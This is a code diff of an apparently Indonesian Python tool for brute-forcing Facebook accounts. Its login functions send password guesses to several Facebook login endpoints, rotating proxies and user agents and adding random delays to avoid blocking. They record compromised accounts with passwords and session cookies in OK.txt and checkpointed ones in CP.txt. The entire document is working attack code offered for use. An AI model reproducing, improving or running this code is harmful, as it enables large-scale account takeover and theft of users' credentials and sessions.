@@ -94,15 +94,20 @@ dia, ualu, ualuh = [], [], []
 sys.stdout.write("\x1b]2; fanky ganteng\x07")
 
 # ------------------[ PROXY BUAT NONTON BKP BTW FANKY GANTENG ]-------------------#
-try:
-    prox = requests.get(
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
-    ).text
-    open(".prox.txt", "w").write(prox)
-except Exception as e:
-    Console().print(
-        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
-    )
+def fetch_proxies():
+    url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
+    
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            proxies = response.text.strip()
+            with open("prox.txt", "w") as file:
+                file.write(proxies)
+            print(f"✅ {len(proxies.splitlines())} proxy berhasil disimpan di prox.txt")
+        else:
+            print("❌ Gagal mengambil proxy, coba lagi nanti.")
+    except Exception as e:
+        print(f"⚠️ Error: {e}")
     exit()
 prox = open(".prox.txt", "r").read().splitlines()
 ###----------[ GET DATA DARI DEVICE ]---------- ###
@@ -1721,103 +1726,93 @@ def fankygraphv1(idf, pwv, url):
     loop += 1  # Tambah counter loop
 
 #-------------------[ CRACK-MAIN ]------------#
+# Load proxy dari file
+with open("prox.txt", "r") as f:
+    proxies = f.read().splitlines()
+
+# Load User-Agent dari file
+with open("ua.txt", "r") as f:
+    uagen = f.read().splitlines()
+
 def fankywww(idf, pwv):
     global loop, ok, cp
-    bo = random.choice([m, k, h, b, u, x])
-    rr = random.randint
-    rc = random.choice
     ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} FENDI Touch {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
-    # ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
-    ua = random.choice(ugen)
+
     for pw in pwv:
         try:
-            if 'ya' in ualuh: 
-                ua = ualu[0]
-            nip = random.choice(prox)
+            ua = random.choice(uagen)  # Random User-Agent tiap request
+            nip = random.choice(proxies)  # Random proxy tiap request
             proxs = {'http': 'socks5://' + nip}
-            requ = ses.get(f'https://touch.alpha.facebook.com/login.php?')
-            head = {
-                'authority': 'touch.alpha.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-                'cache-control': 'max-age=0',
-                'content-type': 'application/x-www-form-urlencoded',
-                'dpr': '1.600000023841858',
-                'origin': 'https://touch.alpha.facebook.com',
-                'referer': 'https://touch.alpha.facebook.com/',
-                'accept-encoding': 'br, gzip',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
-                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Linux"',
-                'sec-ch-ua-platform-version': '""',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': ua,
-                'viewport-width': '980'
-            }
+
+            # Ambil data login form
+            requ = ses.get('https://touch.alpha.facebook.com/login.php?', proxies=proxs, headers={"User-Agent": ua}, timeout=10)
             data = {
-                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ.text)).group(1),
-                'lsd': re.search('name="lsd" value="(.*?)"', str(requ.text)).group(1),
-                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requ.text)).group(1),
-                'li': re.search('name="li" value="(.*?)"', str(requ.text)).group(1),
-                'email': idf,
-                'pass': pw,
-                'next': ''
+                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
+                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
+                "email": idf,
+                "pass": pw
             }
-            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'])
-            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False,proxies=proxs)
-            if "checkpoint" in ses.cookies.get_dict().keys():
+            head = {
+                "User-Agent": ua,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Referer": "https://touch.alpha.facebook.com/"
+            }
+            fankyimut = random.choice([
+                'https://www.facebook.com/login/device-based/regular/login/',
+                'https://m.facebook.com/login/device-based/regular/login/',
+                'https://touch.alpha.facebook.com/login/device-based/regular/login/'
+            ])
+            
+            # Kirim permintaan login
+            po = ses.post(fankyimut, headers=head, data=data, proxies=proxs, allow_redirects=False, timeout=10)
+            
+            # Cek hasil login
+            if "checkpoint" in po.cookies.get_dict().keys():
                 cp += 1
-                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                print(f"❌ CP: {idf} | {pw}")
+                with open("CP.txt", "a") as f:
+                    f.write(f"{idf} | {pw}\n")
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
                 coki = ses.cookies.get_dict()
-                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
-                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                kuki = f"c_user={coki['c_user']}; xs={coki['xs']};"
+                print(f"✅ OK: {idf} | {pw} | {kuki}")
+                with open("OK.txt", "a") as f:
+                    f.write(f"{idf} | {pw} | {kuki}\n")
                 break
             else:
                 continue
+
         except requests.exceptions.ConnectionError:
-            time.sleep(31)
+            print("⚠️ Koneksi error, tunggu 5 detik...")
+            time.sleep(random.randint(5, 10))  # Delay random supaya lebih aman
+
     loop += 1
 
 #-------------------[ CRACK-MAIN ]------------#
+# Load proxy dari file
+with open("prox.txt", "r") as f:
+    proxies = f.read().splitlines()
+
+# Load User-Agent dari file
+with open("ua.txt", "r") as f:
+    uagen = f.read().splitlines()
+
 def fanky_b_api(idf, pwv):
     global loop, ok, cp
-    rr = random.randint
-    rc = random.choice
-    bo = random.choice([m, k, h, b, u, x])
-    # ua = random.choice(ugen)
-    ua = random.choice(ugen)
     ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} FENDI IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
+    
     for pw in pwv:
         try:
-            if 'ya' in ualuh:ua = ualu[0]
-            nip = random.choice(prox)
+            ua = random.choice(uagen)  # Random User-Agent tiap request
+            nip = random.choice(proxies)  # Random proxy tiap request
             proxs = {'http': 'socks5://' + nip}
-            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
+
+            # Ambil data login form
+            requ = ses.get('https://iphone.facebook.com/login/', proxies=proxs, headers={"User-Agent": ua}, timeout=10)
             data = {
                 "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                 "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
@@ -1826,59 +1821,44 @@ def fanky_b_api(idf, pwv):
                 "try_number": "0",
                 "unrecognized_tries": "0",
                 "prefill_contact_point": idf,
-                "prefill_source": "provided_or_soft_matched",
-                "prefill_type": "contact_point",
-                "first_prefill_source": "provided_or_soft_matched",
-                "first_prefill_type": "contact_point",
-                "had_cp_prefilled": "true",
-                "had_password_prefilled": "false",
-                "is_smart_lock": "false",
-                "_fb_noscript": "true",
                 "email": idf,
                 "pass": pw
             }
             head = {
                 "User-Agent": ua,
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-                "Accept-Encoding": "gzip, deflate, br",
-                "Connection": "keep-alive",
-                "Referer": "https://iphone.facebook.com/",
-                "Origin": "https://iphone.facebook.com",
-                "Upgrade-Insecure-Requests": "1",
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-User": "?1",
-                "DNT": "1"
+                "Referer": "https://iphone.facebook.com/"
             }
-            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
-            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
+            fankyimut = random.choice([
+                'https://www.facebook.com/login/device-based/regular/login/',
+                'https://m.facebook.com/login/device-based/regular/login/'
+            ])
+            
+            # Kirim permintaan login
+            po = ses.post(fankyimut, headers=head, data=data, proxies=proxs, allow_redirects=False, timeout=10)
+            
+            # Cek hasil login
             if "checkpoint" in po.cookies.get_dict().keys():
                 cp += 1
-                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                print(f"❌ CP: {idf} | {pw}")
+                with open("CP.txt", "a") as f:
+                    f.write(f"{idf} | {pw}\n")
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
                 coki = ses.cookies.get_dict()
-                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
-                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                kuki = f"c_user={coki['c_user']}; xs={coki['xs']};"
+                print(f"✅ OK: {idf} | {pw} | {kuki}")
+                with open("OK.txt", "a") as f:
+                    f.write(f"{idf} | {pw} | {kuki}\n")
                 break
             else:
                 continue
+
         except requests.exceptions.ConnectionError:
-            time.sleep(31)
+            print("⚠️ Koneksi error, tunggu 5 detik...")
+            time.sleep(5)
+
     loop += 1
 #-------------------[ CRACK-MAIN ]------------#
 def fankytouch(idf,pwv):
@@ -1930,105 +1910,85 @@ def fankytouch(idf,pwv):
 	loop+=1
 
 #-----------------CRACK-MAIN---------------#
+# Load Proxy SOCKS5 dari file
+with open("prox.txt", "r") as f:
+    proxies = f.read().splitlines()
+
+# Load User-Agent dari file
+with open("ua.txt", "r") as f:
+    uagen = f.read().splitlines()
+
 def fankytouch_mobile(idf, pwv):
     global loop, ok, cp
-    rr = random.randint
-    rc = random.choice
-    bo = random.choice([m, k, h, b, u, x])
-    ua = random.choice(ugen)
     ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} FENDI MTOUCH {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
+
     for pw in pwv:
         try:
-            if 'ya' in ualuh: ua = ualu[0]
-            nip = random.choice(prox)
+            ua = random.choice(uagen)  # Random User-Agent
+            nip = random.choice(proxies)  # Random Proxy
             proxs = {'http': 'socks5://' + nip}
+
+            # Ambil halaman login buat dapetin hidden form data
             getfan = "https://m.facebook.com/login.php"
-            requ = ses.get(getfan)
+            requ = ses.get(getfan, proxies=proxs, headers={"User-Agent": ua}, timeout=10)
+            
+            if requ.status_code != 200:
+                print("⚠️ Gagal ambil halaman login, coba lagi...")
+                continue
+            
             koki = (";").join(["%s=%s" % (key, value) for key, value in requ.cookies.get_dict().items()])
+            
+            # Ambil hidden field dari HTML form login
+            try:
+                lsd = re.search('name="lsd" value="(.*?)"', requ.text).group(1)
+                jazoest = re.search('name="jazoest" value="(.*?)"', requ.text).group(1)
+                m_ts = re.search('name="m_ts" value="(.*?)"', requ.text).group(1)
+                li = re.search('name="li" value="(.*?)"', requ.text).group(1)
+            except:
+                print("❌ Gagal parsing login data.")
+                continue
+
             headers = {
                 "User-Agent": ua,
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "keep-alive",
                 "Referer": "https://m.facebook.com/",
-                "Origin": "https://m.facebook.com",
-                "Upgrade-Insecure-Requests": "1",
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-User": "?1",
-                "DNT": "1",
-                "TE": "trailers",
-                "X-Requested-With": "com.facebook.katana"
             }
             data = {
-                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
-                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
-                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
-                "try_number": "0",
-                "unrecognized_tries": "0",
+                "lsd": lsd,
+                "jazoest": jazoest,
+                "m_ts": m_ts,
+                "li": li,
                 "email": idf,
                 "pass": pw,
                 "encpass": f"#PWD_BROWSER:0:{int(time.time())}:{pw}",
-                "prefill_contact_point": idf,
-                "prefill_source": "browser_dropdown",
-                "prefill_type": "password_autofill",
-                "first_prefill_source": "browser_dropdown",
-                "first_prefill_type": "password_autofill",
-                "had_cp_prefilled": "true",
-                "had_password_prefilled": "true",
-                "is_smart_lock": "true",
-                "bi_xrwh": "0",
-                "_fb_noscript": "true",
-                "source": "login",
-                "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwMzEsImMiOjI0fQ==",
-                "timezone": "-420",
-                "lgndim": "2560,1440,2",
-                "guid": str(uuid.uuid4()),
-                "login_source": "login",
-                "meta_inf_fbmeta": "",
-                "skip_api_login": "1",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-                "signed_next": "1",
-                "next": "https://m.facebook.com/",
-                "fb_dtsg": "",
-                "checked_login": "true",
-                "ab_test_data": "",
-                "login_attempt": "1",
-                "sso_device": "mobile",
-                "sso_version": "2.0"
             }
+
             fankyurl = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9"
-            po = ses.post(fankyurl, headers=headers, cookies={'cookie': koki}, data=data)
+            po = ses.post(fankyurl, headers=headers, cookies={'cookie': koki}, data=data, proxies=proxs, allow_redirects=False, timeout=10)
+
+            # Cek hasil login
             if "checkpoint" in ses.cookies.get_dict().keys():
                 cp += 1
-                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                print(f"❌ CP: {idf} | {pw}")
+                with open("CP.txt", "a") as f:
+                    f.write(f"{idf} | {pw}\n")
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
                 coki = ses.cookies.get_dict()
-                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
-                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
+                kuki = f"c_user={coki['c_user']}; xs={coki['xs']};"
+                print(f"✅ OK: {idf} | {pw} | {kuki}")
+                with open("OK.txt", "a") as f:
+                    f.write(f"{idf} | {pw} | {kuki}\n")
                 break
             else:
+                print(f"🔄 Gagal login: {idf} | {pw}, coba password lain...")
                 continue
+
         except requests.exceptions.ConnectionError:
-            time.sleep(31)
+            print("⚠️ Koneksi error, tunggu 5 detik...")
+            time.sleep(random.randint(5, 10))  # Delay random supaya lebih aman
+
     loop += 1
 
 # -----------------------[ SYSTEM-CONTROL ]--------------------#
